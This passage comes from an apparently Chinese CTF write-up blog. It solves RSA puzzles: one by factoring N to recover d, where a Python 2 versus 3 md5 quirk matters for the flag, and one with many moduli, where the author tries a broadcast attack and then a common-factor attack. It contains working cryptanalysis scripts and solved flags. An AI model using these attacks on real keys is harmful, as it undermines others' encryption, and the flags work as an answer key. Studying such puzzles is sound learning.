class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="rsa2"><a href="#rsa2" class="headerlink" title="rsa2"></a>rsa2</h2><h3 id="题目-9"><a href="#题目-9" class="headerlink" title="题目"></a>题目</h3><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">import</span> hashlib</span><br><span class="line"><span class="built_in">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="attr">N</span> = <span class="number">101991809777553253470276751399264740131157682329252673501792154507006158434432009141995367241962525705950046253400188884658262496534706438791515071885860897552736656899566915731297225817250639873643376310103992170646906557242832893914902053581087502512787303322747780420210884852166586717636559058152544979471</span></span><br><span class="line"><span class="attr">e</span> = <span class="number">46731919563265721307105180410302518676676135509737992912625092976849075262192092549323082367518264378630543338219025744820916471913696072050291990620486581719410354385121760761374229374847695148230596005409978383369740305816082770283909611956355972181848077519920922059268376958811713365106925235218265173085</span></span><br><span class="line"></span><br><span class="line"><span class="attr">flag</span> = <span class="string">&quot;flag&#123;&quot;</span> + hashlib.md5(hex(d).encode()).hexdigest() + <span class="string">&quot;&#125;&quot;</span></span><br></pre></td></tr></table></figure><h3 id="题解-8"><a href="#题解-8" class="headerlink" title="题解"></a>题解</h3><p>看出来求d再md5转换后即可。</p><ul><li><p>这里考察本意是e过大的情况下，利用维纳攻击</p><p><a href="https://www.codeleading.com/article/48225801201/">e过大的维纳攻击</a></p></li></ul><p>但此题的p、q发现可拆，则有以下</p><h4 id="代码-9"><a href="#代码-9" class="headerlink" title="代码"></a>代码</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">import</span> hashlib</span><br><span class="line"><span class="attribute">import</span> gmpy<span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">N</span> = <span class="number">101991809777553253470276751399264740131157682329252673501792154507006158434432009141995367241962525705950046253400188884658262496534706438791515071885860897552736656899566915731297225817250639873643376310103992170646906557242832893914902053581087502512787303322747780420210884852166586717636559058152544979471</span></span><br><span class="line"><span class="attribute">e</span> = <span class="number">46731919563265721307105180410302518676676135509737992912625092976849075262192092549323082367518264378630543338219025744820916471913696072050291990620486581719410354385121760761374229374847695148230596005409978383369740305816082770283909611956355972181848077519920922059268376958811713365106925235218265173085</span></span><br><span class="line"><span class="attribute">p</span> = <span class="number">9046853915223503351787031888977627106934564043204783593118678181991596316582877057556463152579621699010610569526573031954779520781448550677767565207407183</span></span><br><span class="line"><span class="attribute">q</span> = <span class="number">11273732364123571293429600400343309403733952146912318879993851141423284675797325272321856863528776914709992821287788339848962916204774010644058033316303937</span></span><br><span class="line"><span class="attribute">phi</span> = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line"><span class="attribute">d</span> = gmpy<span class="number">2</span>.invert(e, phi)</span><br><span class="line"><span class="attribute">print</span>(d)</span><br><span class="line"><span class="comment"># 8920758995414587152829426558580025657357328745839747693739591820283538307445</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">flag</span> = <span class="string">&quot;flag&#123;&quot;</span> + hashlib.md<span class="number">5</span>(hex(int(d)).encode()).hexdigest() + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line"><span class="attribute">print</span>(flag)</span><br><span class="line"><span class="comment"># flag&#123;8159e6c4abdd3b94ce461ed9a1a24017&#125;   ❌     Py3</span></span><br><span class="line"><span class="comment"># flag&#123;2cf5122fc7b4e0e24c93d8c2f8323b10&#125;   ❌     CMD5 </span></span><br><span class="line"><span class="comment"># flag&#123;47bf28da384590448e0b0d23909a25a4&#125;   ✅     Py2</span></span><br></pre></td></tr></table></figure><p>交了好几次flag都错了，对比他人题解，得知：</p><ul><li><p>d没错，此方法可行</p></li><li><p>因为Py2与Py3的差异，导致相同值的md5值不同</p><p><a href="https://blog.csdn.net/myli_binbin/article/details/84333071">Python·md5注意事项</a></p></li><li><p>其后在cmd5网站加密后的结果与另一部分题解相同，但仍不正确</p></li><li><p>必须在Py2环境下md5加密</p></li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><strong>Python2.X的环境还得留着，以备不时之需</strong></p><h2 id="RSA5"><a href="#RSA5" class="headerlink" title="RSA5"></a>RSA5</h2><h3 id="题目-10"><a href="#题目-10" class="headerlink" title="题目"></a>题目</h3><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">m</span> = xxxxxxxx</span><br><span class="line"><span class="attr">e</span> = <span class="number">65537</span></span><br><span class="line">========== n <span class="attr">c</span> ==========</span><br><span class="line"><span class="attr">n</span> = <span class="number">20474918894051778533305262345601880928088284471121823754049725354072477155873778848055073843345820697886641086842612486541250183965966001591342031562953561793332341641334302847996108417466360688139866505179689516589305636902137210185624650854906780037204412206309949199080005576922775773722438863762117750429327585792093447423980002401200613302943834212820909269713876683465817369158585822294675056978970612202885426436071950214538262921077409076160417436699836138801162621314845608796870206834704116707763169847387223307828908570944984416973019427529790029089766264949078038669523465243837675263858062854739083634207</span></span><br><span class="line"><span class="attr">c</span> = <span class="number">974463908243330865728978769213595400782053398596897741316275722596415018912929508637393850919224969271766388710025195039896961956062895570062146947736340342927974992616678893372744261954172873490878805483241196345881721164078651156067119957816422768524442025688079462656755605982104174001635345874022133045402344010045961111720151990412034477755851802769069309069018738541854130183692204758761427121279982002993939745343695671900015296790637464880337375511536424796890996526681200633086841036320395847725935744757993013352804650575068136129295591306569213300156333650910795946800820067494143364885842896291126137320</span></span><br><span class="line"></span><br><span class="line"><span class="attr">n</span> = <span class="number">20918819960648891349438263046954902210959146407860980742165930253781318759285692492511475263234242002509419079545644051755251311392635763412553499744506421566074721268822337321637265942226790343839856182100575539845358877493718334237585821263388181126545189723429262149630651289446553402190531135520836104217160268349688525168375213462570213612845898989694324269410202496871688649978370284661017399056903931840656757330859626183773396574056413017367606446540199973155630466239453637232936904063706551160650295031273385619470740593510267285957905801566362502262757750629162937373721291789527659531499435235261620309759</span></span><br><span class="line"><span class="attr">c</span> = <span class="number">15819636201971185538694880505120469332582151856714070824521803121848292387556864177196229718923770810072104155432038682511434979353089791861087415144087855679134383396897817458726543883093567600325204596156649305930352575274039425470836355002691145864435755333821133969266951545158052745938252574301327696822347115053614052423028835532509220641378760800693351542633860702225772638930501021571415907348128269681224178300248272689705308911282208685459668200507057183420662959113956077584781737983254788703048275698921427029884282557468334399677849962342196140864403989162117738206246183665814938783122909930082802031855</span></span><br><span class="line"></span><br><span class="line"><span class="attr">n</span> = <span class="number">25033254625906757272369609119214202033162128625171246436639570615263949157363273213121556825878737923265290579551873824374870957467163989542063489416636713654642486717219231225074115269684119428086352535471683359486248203644461465935500517901513233739152882943010177276545128308412934555830087776128355125932914846459470221102007666912211992310538890654396487111705385730502843589727289829692152177134753098649781412247065660637826282055169991824099110916576856188876975621376606634258927784025787142263367152947108720757222446686415627479703666031871635656314282727051189190889008763055811680040315277078928068816491</span></span><br><span class="line"><span class="attr">c</span> = <span class="number">4185308529416874005831230781014092407198451385955677399668501833902623478395669279404883990725184332709152443372583701076198786635291739356770857286702107156730020004358955622511061410661058982622055199736820808203841446796305284394651714430918690389486920560834672316158146453183789412140939029029324756035358081754426645160033262924330248675216108270980157049705488620263485129480952814764002865280019185127662449318324279383277766416258142275143923532168798413011028271543085249029048997452212503111742302302065401051458066585395360468447460658672952851643547193822775218387853623453638025492389122204507555908862</span></span><br><span class="line"></span><br><span class="line"><span class="attr">n</span> = <span class="number">21206968097314131007183427944486801953583151151443627943113736996776787181111063957960698092696800555044199156765677935373149598221184792286812213294617749834607696302116136745662816658117055427803315230042700695125718401646810484873064775005221089174056824724922160855810527236751389605017579545235876864998419873065217294820244730785120525126565815560229001887622837549118168081685183371092395128598125004730268910276024806808565802081366898904032509920453785997056150497645234925528883879419642189109649009132381586673390027614766605038951015853086721168018787523459264932165046816881682774229243688581614306480751</span></span><br><span class="line"><span class="attr">c</span> = <span class="number">4521038011044758441891128468467233088493885750850588985708519911154778090597136126150289041893454126674468141393472662337350361712212694867311622970440707727941113263832357173141775855227973742571088974593476302084111770625764222838366277559560887042948859892138551472680654517814916609279748365580610712259856677740518477086531592233107175470068291903607505799432931989663707477017904611426213770238397005743730386080031955694158466558475599751940245039167629126576784024482348452868313417471542956778285567779435940267140679906686531862467627238401003459101637191297209422470388121802536569761414457618258343550613</span></span><br><span class="line"></span><br><span class="line"><span class="attr">n</span> = <span class="number">22822039733049388110936778173014765663663303811791283234361230649775805923902173438553927805407463106104699773994158375704033093471761387799852168337898526980521753614307899669015931387819927421875316304591521901592823814417756447695701045846773508629371397013053684553042185725059996791532391626429712416994990889693732805181947970071429309599614973772736556299404246424791660679253884940021728846906344198854779191951739719342908761330661910477119933428550774242910420952496929605686154799487839923424336353747442153571678064520763149793294360787821751703543288696726923909670396821551053048035619499706391118145067</span></span><br><span class="line"><span class="attr">c</span> = <span class="number">15406498580761780108625891878008526815145372096234083936681442225155097299264808624358826686906535594853622687379268969468433072388149786607395396424104318820879443743112358706546753935215756078345959375299650718555759698887852318017597503074317356745122514481807843745626429797861463012940172797612589031686718185390345389295851075279278516147076602270178540690147808314172798987497259330037810328523464851895621851859027823681655934104713689539848047163088666896473665500158179046196538210778897730209572708430067658411755959866033531700460551556380993982706171848970460224304996455600503982223448904878212849412357</span></span><br><span class="line"></span><br><span class="line"><span class="attr">n</span> = <span class="number">21574139855341432908474064784318462018475296809327285532337706940126942575349507668289214078026102682252713757703081553093108823214063791518482289846780197329821139507974763780260290309600884920811959842925540583967085670848765317877441480914852329276375776405689784571404635852204097622600656222714808541872252335877037561388406257181715278766652824786376262249274960467193961956690974853679795249158751078422296580367506219719738762159965958877806187461070689071290948181949561254144310776943334859775121650186245846031720507944987838489723127897223416802436021278671237227993686791944711422345000479751187704426369</span></span><br><span class="line"><span class="attr">c</span> = <span class="number">20366856150710305124583065375297661819795242238376485264951185336996083744604593418983336285185491197426018595031444652123288461491879021096028203694136683203441692987069563513026001861435722117985559909692670907347563594578265880806540396777223906955491026286843168637367593400342814725694366078337030937104035993569672959361347287894143027186846856772983058328919716702982222142848848117768499996617588305301483085428547267337070998767412540225911508196842253134355901263861121500650240296746702967594224401650220168780537141654489215019142122284308116284129004257364769474080721001708734051264841350424152506027932</span></span><br><span class="line"></span><br><span class="line"><span class="attr">n</span> = <span class="number">25360227412666612490102161131174584819240931803196448481224305250583841439581008528535930814167338381983764991296575637231916547647970573758269411168219302370541684789125112505021148506809643081950237623703181025696585998044695691322012183660424636496897073045557400768745943787342548267386564625462143150176113656264450210023925571945961405709276631990731602198104287528528055650050486159837612279600415259486306154947514005408907590083747758953115486124865486720633820559135063440942528031402951958557630833503775112010715604278114325528993771081233535247118481765852273252404963430792898948219539473312462979849137</span></span><br><span class="line"><span class="attr">c</span> = <span class="number">19892772524651452341027595619482734356243435671592398172680379981502759695784087900669089919987705675899945658648623800090272599154590123082189645021800958076861518397325439521139995652026377132368232502108620033400051346127757698623886142621793423225749240286511666556091787851683978017506983310073524398287279737680091787333547538239920607761080988243639547570818363788673249582783015475682109984715293163137324439862838574460108793714172603672477766831356411304446881998674779501188163600664488032943639694828698984739492200699684462748922883550002652913518229322945040819064133350314536378694523704793396169065179</span></span><br><span class="line"></span><br><span class="line"><span class="attr">n</span> = <span class="number">22726855244632356029159691753451822163331519237547639938779517751496498713174588935566576167329576494790219360727877166074136496129927296296996970048082870488804456564986667129388136556137013346228118981936899510687589585286517151323048293150257036847475424044378109168179412287889340596394755257704938006162677656581509375471102546261355748251869048003600520034656264521931808651038524134185732929570384705918563982065684145766427962502261522481994191989820110575981906998431553107525542001187655703534683231777988419268338249547641335718393312295800044734534761692799403469497954062897856299031257454735945867491191</span></span><br><span class="line"><span class="attr">c</span> = <span class="number">6040119795175856407541082360023532204614723858688636724822712717572759793960246341800308149739809871234313049629732934797569781053000686185666374833978403290525072598774001731350244744590772795701065129561898116576499984185920661271123665356132719193665474235596884239108030605882777868856122378222681140570519180321286976947154042272622411303981011302586225630859892731724640574658125478287115198406253847367979883768000812605395482952698689604477719478947595442185921480652637868335673233200662100621025061500895729605305665864693122952557361871523165300206070325660353095592778037767395360329231331322823610060006</span></span><br><span class="line"></span><br><span class="line"><span class="attr">n</span> = <span class="number">23297333791443053297363000786835336095252290818461950054542658327484507406594632785712767459958917943095522594228205423428207345128899745800927319147257669773812669542782839237744305180098276578841929496345963997512244219376701787616046235397139381894837435562662591060768476997333538748065294033141610502252325292801816812268934171361934399951548627267791401089703937389012586581080223313060159456238857080740699528666411303029934807011214953984169785844714159627792016926490955282697877141614638806397689306795328344778478692084754216753425842557818899467945102646776342655167655384224860504086083147841252232760941</span></span><br><span class="line"><span class="attr">c</span> = <span class="number">5418120301208378713115889465579964257871814114515046096090960159737859076829258516920361577853903925954198406843757303687557848302302200229295916902430205737843601806700738234756698575708612424928480440868739120075888681672062206529156566421276611107802917418993625029690627196813830326369874249777619239603300605876865967515719079797115910578653562787899019310139945904958024882417833736304894765433489476234575356755275147256577387022873348906900149634940747104513850154118106991137072643308620284663108283052245750945228995387803432128842152251549292698947407663643895853432650029352092018372834457054271102816934</span></span><br><span class="line"></span><br><span class="line"><span class="attr">n</span> = <span class="number">28873667904715682722987234293493200306976947898711255064125115933666968678742598858722431426218914462903521596341771131695619382266194233561677824357379805303885993804266436810606263022097900266975250431575654686915049693091467864820512767070713267708993899899011156106766178906700336111712803362113039613548672937053397875663144794018087017731949087794894903737682383916173267421403408140967713071026001874733487295007501068871044649170615709891451856792232315526696220161842742664778581287321318748202431466508948902745314372299799561625186955234673012098210919745879882268512656931714326782335211089576897310591491</span></span><br><span class="line"><span class="attr">c</span> = <span class="number">9919880463786836684987957979091527477471444996392375244075527841865509160181666543016317634963512437510324198702416322841377489417029572388474450075801462996825244657530286107428186354172836716502817609070590929769261932324275353289939302536440310628698349244872064005700644520223727670950787924296004296883032978941200883362653993351638545860207179022472492671256630427228461852668118035317021428675954874947015197745916918197725121122236369382741533983023462255913924692806249387449016629865823316402366017657844166919846683497851842388058283856219900535567427103603869955066193425501385255322097901531402103883869</span></span><br><span class="line"></span><br><span class="line"><span class="attr">n</span> = <span class="number">22324685947539653722499932469409607533065419157347813961958075689047690465266404384199483683908594787312445528159635527833904475801890381455653807265501217328757871352731293000303438205315816792663917579066674842307743845261771032363928568844669895768092515658328756229245837025261744260614860746997931503548788509983868038349720225305730985576293675269073709022350700836510054067641753713212999954307022524495885583361707378513742162566339010134354907863733205921845038918224463903789841881400814074587261720283879760122070901466517118265422863420376921536734845502100251460872499122236686832189549698020737176683019</span></span><br><span class="line"><span class="attr">c</span> = <span class="number">1491527050203294989882829248560395184804977277747126143103957219164624187528441047837351263580440686474767380464005540264627910126483129930668344095814547592115061057843470131498075060420395111008619027199037019925701236660166563068245683975787762804359520164701691690916482591026138582705558246869496162759780878437137960823000043988227303003876410503121370163303711603359430764539337597866862508451528158285103251810058741879687875218384160282506172706613359477657215420734816049393339593755489218588796607060261897905233453268671411610631047340459487937479511933450369462213795738933019001471803157607791738538467</span></span><br><span class="line"></span><br><span class="line"><span class="attr">n</span> = <span class="number">27646746423759020111007828653264027999257847645666129907789026054594393648800236117046769112762641778865620892443423100189619327585811384883515424918752749559627553637785037359639801125213256163008431942593727931931898199727552768626775618479833029101249692573716030706695702510982283555740851047022672485743432464647772882314215176114732257497240284164016914018689044557218920300262234652840632406067273375269301008409860193180822366735877288205783314326102263756503786736122321348320031950012144905869556204017430593656052867939493633163499580242224763404338807022510136217187779084917996171602737036564991036724299</span></span><br><span class="line"><span class="attr">c</span> = <span class="number">21991524128957260536043771284854920393105808126700128222125856775506885721971193109361315961129190814674647136464887087893990660894961612838205086401018885457667488911898654270235561980111174603323721280911197488286585269356849579263043456316319476495888696219344219866516861187654180509247881251251278919346267129904739277386289240394384575124331135655943513831009934023397457082184699737734388823763306805326430395849935770213817533387235486307008892410920611669932693018165569417445885810825749609388627231235840912644654685819620931663346297596334834498661789016450371769203650109994771872404185770230172934013971</span></span><br><span class="line"></span><br><span class="line"><span class="attr">n</span> = <span class="number">20545487405816928731738988374475012686827933709789784391855706835136270270933401203019329136937650878386117187776530639342572123237188053978622697282521473917978282830432161153221216194169879669541998840691383025487220850872075436064308499924958517979727954402965612196081404341651517326364041519250125036424822634354268773895465698920883439222996581226358595873993976604699830613932320720554130011671297944433515047180565484495191003887599891289037982010216357831078328159028953222056918189365840711588671093333013117454034313622855082795813122338562446223041211192277089225078324682108033843023903550172891959673551</span></span><br><span class="line"><span class="attr">c</span> = <span class="number">14227439188191029461250476692790539654619199888487319429114414557975376308688908028140817157205579804059783807641305577385724758530138514972962209062230576107406142402603484375626077345190883094097636019771377866339531511965136650567412363889183159616188449263752475328663245311059988337996047359263288837436305588848044572937759424466586870280512424336807064729894515840552404756879590698797046333336445465120445087587621743906624279621779634772378802959109714400516183718323267273824736540168545946444437586299214110424738159957388350785999348535171553569373088251552712391288365295267665691357719616011613628772175</span></span><br><span class="line"></span><br><span class="line"><span class="attr">n</span> = <span class="number">27359727711584277234897157724055852794019216845229798938655814269460046384353568138598567755392559653460949444557879120040796798142218939251844762461270251672399546774067275348291003962551964648742053215424620256999345448398805278592777049668281558312871773979931343097806878701114056030041506690476954254006592555275342579529625231194321357904668512121539514880704046969974898412095675082585315458267591016734924646294357666924293908418345508902112711075232047998775303603175363964055048589769318562104883659754974955561725694779754279606726358588862479198815999276839234952142017210593887371950645418417355912567987</span></span><br><span class="line"><span class="attr">c</span> = <span class="number">3788529784248255027081674540877016372807848222776887920453488878247137930578296797437647922494510483767651150492933356093288965943741570268943861987024276610712717409139946409513963043114463933146088430004237747163422802959250296602570649363016151581364006795894226599584708072582696996740518887606785460775851029814280359385763091078902301957226484620428513604630585131511167015763190591225884202772840456563643159507805711004113901417503751181050823638207803533111429510911616160851391754754434764819568054850823810901159821297849790005646102129354035735350124476838786661542089045509656910348676742844957008857457</span></span><br><span class="line"></span><br><span class="line"><span class="attr">n</span> = <span class="number">27545937603751737248785220891735796468973329738076209144079921449967292572349424539010502287564030116831261268197384650511043068738911429169730640135947800885987171539267214611907687570587001933829208655100828045651391618089603288456570334500533178695238407684702251252671579371018651675054368606282524673369983034682330578308769886456335818733827237294570476853673552685361689144261552895758266522393004116017849397346259119221063821663280935820440671825601452417487330105280889520007917979115568067161590058277418371493228631232457972494285014767469893647892888681433965857496916110704944758070268626897045014782837</span></span><br><span class="line"><span class="attr">c</span> = <span class="number">14069112970608895732417039977542732665796601893762401500878786871680645798754783315693511261740059725171342404186571066972546332813667711135661176659424619936101038903439144294886379322591635766682645179888058617577572409307484708171144488708410543462972008179994594087473935638026612679389759756811490524127195628741262871304427908481214992471182859308828778119005750928935764927967212343526503410515793717201360360437981322576798056276657140363332700714732224848346808963992302409037706094588964170239521193589470070839790404597252990818583717869140229811712295005710540476356743378906642267045723633874011649259842</span></span><br><span class="line"></span><br><span class="line"><span class="attr">n</span> = <span class="number">25746162075697911560263181791216433062574178572424600336856278176112733054431463253903433128232709054141607100891177804285813783247735063753406524678030561284491481221681954564804141454666928657549670266775659862814924386584148785453647316864935942772919140563506305666207816897601862713092809234429096584753263707828899780979223118181009293655563146526792388913462557306433664296966331469906428665127438829399703002867800269947855869262036714256550075520193125987011945192273531732276641728008406855871598678936585324782438668746810516660152018244253008092470066555687277138937298747951929576231036251316270602513451</span></span><br><span class="line"><span class="attr">c</span> = <span class="number">17344284860275489477491525819922855326792275128719709401292545608122859829827462088390044612234967551682879954301458425842831995513832410355328065562098763660326163262033200347338773439095709944202252494552172589503915965931524326523663289777583152664722241920800537867331030623906674081852296232306336271542832728410803631170229642717524942332390842467035143631504401140727083270732464237443915263865880580308776111219718961746378842924644142127243573824972533819479079381023103585862099063382129757560124074676150622288706094110075567706403442920696472627797607697962873026112240527498308535903232663939028587036724</span></span><br><span class="line"></span><br><span class="line"><span class="attr">n</span> = <span class="number">23288486934117120315036919418588136227028485494137930196323715336208849327833965693894670567217971727921243839129969128783853015760155446770590696037582684845937132790047363216362087277861336964760890214059732779383020349204803205725870225429985939570141508220041286857810048164696707018663758416807708910671477407366098883430811861933014973409390179948577712579749352299440310543689035651465399867908428885541237776143404376333442949397063249223702355051571790555151203866821867908531733788784978667478707672984539512431549558672467752712004519300318999208102076732501412589104904734983789895358753664077486894529499</span></span><br><span class="line"><span class="attr">c</span> = <span class="number">10738254418114076548071448844964046468141621740603214384986354189105236977071001429271560636428075970459890958274941762528116445171161040040833357876134689749846940052619392750394683504816081193432350669452446113285638982551762586656329109007214019944975816434827768882704630460001209452239162896576191876324662333153835533956600295255158377025198426950944040643235430211011063586032467724329735785947372051759042138171054165854842472990583800899984893232549092766400510300083585513014171220423103452292891496141806956300396540682381668367564569427813092064053993103537635994311143010708814851867239706492577203899024</span></span><br><span class="line"></span><br><span class="line"><span class="attr">n</span> = <span class="number">19591441383958529435598729113936346657001352578357909347657257239777540424811749817783061233235817916560689138344041497732749011519736303038986277394036718790971374656832741054547056417771501234494768509780369075443550907847298246275717420562375114406055733620258777905222169702036494045086017381084272496162770259955811174440490126514747876661317750649488774992348005044389081101686016446219264069971370646319546429782904810063020324704138495608761532563310699753322444871060383693044481932265801505819646998535192083036872551683405766123968487907648980900712118052346174533513978009131757167547595857552370586353973</span></span><br><span class="line"><span class="attr">c</span> = <span class="number">3834917098887202931981968704659119341624432294759361919553937551053499607440333234018189141970246302299385742548278589896033282894981200353270637127213483172182529890495903425649116755901631101665876301799865612717750360089085179142750664603454193642053016384714515855868368723508922271767190285521137785688075622832924829248362774476456232826885801046969384519549385428259591566716890844604696258783639390854153039329480726205147199247183621535172450825979047132495439603840806501254997167051142427157381799890725323765558803808030109468048682252028720241357478614704610089120810367192414352034177484688502364022887</span></span><br><span class="line"></span><br><span class="line"><span class="attr">n</span> = <span class="number">19254242571588430171308191757871261075358521158624745702744057556054652332495961196795369630484782930292003238730267396462491733557715379956969694238267908985251699834707734400775311452868924330866502429576951934279223234676654749272932769107390976321208605516299532560054081301829440688796904635446986081691156842271268059970762004259219036753174909942343204432795076377432107630203621754552804124408792358220071862369443201584155711893388877350138023238624566616551246804054720492816226651467017802504094070614892556444425915920269485861799532473383304622064493223627552558344088839860178294589481899206318863310603</span></span><br><span class="line"><span class="attr">c</span> = <span class="number">6790553533991297205804561991225493105312398825187682250780197510784765226429663284220400480563039341938599783346724051076211265663468643826430109013245014035811178295081939958687087477312867720289964506097819762095244479129359998867671811819738196687884696680463458661374310994610760009474264115750204920875527434486437536623589684519411519100170291423367424938566820315486507444202022408003879118465761273916755290898112991525546114191064022991329724370064632569903856189236177894007766690782630247443895358893983735822824243487181851098787271270256780891094405121947631088729917398317652320497765101790132679171889</span></span><br><span class="line"></span><br><span class="line"><span class="attr">n</span> = <span class="number">26809700251171279102974962949184411136459372267620535198421449833298448092580497485301953796619185339316064387798092220298630428207556482805739803420279056191194360049651767412572609187680508073074653291350998253938793269214230457117194434853888765303403385824786231859450351212449404870776320297419712486574804794325602760347306432927281716160368830187944940128907971027838510079519466846176106565164730963988892400240063089397720414921398936399927948235195085202171264728816184532651138221862240969655185596628285814057082448321749567943946273776184657698104465062749244327092588237927996419620170254423837876806659</span></span><br><span class="line"><span class="attr">c</span> = <span class="number">386213556608434013769864727123879412041991271528990528548507451210692618986652870424632219424601677524265011043146748309774067894985069288067952546139416819404039688454756044862784630882833496090822568580572859029800646671301748901528132153712913301179254879877441322285914544974519727307311002330350534857867516466612474769753577858660075830592891403551867246057397839688329172530177187042229028685862036140779065771061933528137423019407311473581832405899089709251747002788032002094495379614686544672969073249309703482556386024622814731015767810042969813752548617464974915714425595351940266077021672409858645427346</span></span><br></pre></td></tr></table></figure><h3 id="题解-9"><a href="#题解-9" class="headerlink" title="题解"></a>题解</h3><p><strong>相同m、e， 不同n</strong></p><p>很像是广播攻击，但加密指数不低🤔</p><p>还是试了下，没成功</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii, gmpy2</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CRT</span>(<span class="params">mi, ai</span>):</span></span><br><span class="line">    <span class="keyword">assert</span> (reduce(gmpy2.gcd, mi) == <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">assert</span> (<span class="built_in">isinstance</span>(mi, <span class="built_in">list</span>) <span class="keyword">and</span> <span class="built_in">isinstance</span>(ai, <span class="built_in">list</span>))</span><br><span class="line">    M = reduce(<span class="keyword">lambda</span> x, y: x * y, mi)</span><br><span class="line">    ai_ti_Mi = [a * (M // m) * gmpy2.invert(M // m, m) <span class="keyword">for</span> (m, a) <span class="keyword">in</span> <span class="built_in">zip</span>(mi, ai)]</span><br><span class="line">    <span class="keyword">return</span> reduce(<span class="keyword">lambda</span> x, y: x + y, ai_ti_Mi) % M</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获得n、c数据</span></span><br><span class="line">n_list = []</span><br><span class="line">c_list = []</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/Users/wenhui/Desktop/1.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> f:</span><br><span class="line">        <span class="keyword">if</span> each.startswith(<span class="string">&quot;n =&quot;</span>):</span><br><span class="line">            n_list.append(<span class="built_in">int</span>(each[<span class="number">4</span>:].strip(<span class="string">&#x27;\n&#x27;</span>)))</span><br><span class="line">        <span class="keyword">elif</span> each.startswith(<span class="string">&quot;c =&quot;</span>):</span><br><span class="line">            c_list.append(<span class="built_in">int</span>(each[<span class="number">4</span>:].strip(<span class="string">&#x27;\n&#x27;</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m = gmpy2.iroot(CRT(n_list, c_list), e)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)))</span><br></pre></td></tr></table></figure><p>思维窃取ing</p><p>奥，拆不出来的p、q</p><p>且那么正常的e 不该是低加密指数广播攻击 但n真的很多，就该考虑<strong>n不互素</strong>，找到p</p><p>获得思路后，再写代码！</p><h4 id="代码-10"><a href="#代码-10" class="headerlink" title="代码"></a>代码</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 